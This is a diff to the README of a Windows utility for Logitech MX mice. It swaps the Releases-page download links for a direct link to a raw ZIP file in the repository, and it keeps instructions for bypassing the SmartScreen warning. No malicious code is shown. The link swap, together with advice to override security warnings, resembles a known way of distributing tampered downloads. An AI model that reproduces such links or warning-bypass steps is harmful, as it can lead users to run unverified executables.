@@ -10,7 +10,7 @@ For Logitech MX mice, made for the MX Master 3S on a Logi Bolt receiver or Bluet
 
 English · [العربية](README.ar.md)
 
-[**Download Mishk.exe**](../../releases/latest)
+[**Download Mishk for Windows**](https://github.com/dlwjan11-dot/Mishk/raw/main/download/Mishk-Windows.zip)
 
 </div>
 
@@ -61,7 +61,7 @@ Mishk talks to the mouse directly over Logitech's HID++ protocol. Buttons are re
 ## Getting started
 
 1. Quit Logi Options+, and turn off its startup. Both apps fight over the mouse. Mishk warns you if Options+ is running and can close it.
-2. Download `Mishk.exe` from [Releases](../../releases/latest) and run it.
+2. [Download Mishk-Windows.zip](https://github.com/dlwjan11-dot/Mishk/raw/main/download/Mishk-Windows.zip), right-click it and choose **Extract All**, then run `Mishk.exe`.
 3. Windows SmartScreen may warn you because the app isn't signed: click **More info**, then **Run anyway**.
 
 Mishk adds itself to the tray and starts with Windows. Settings are saved in `%APPDATA%\Mishk`.
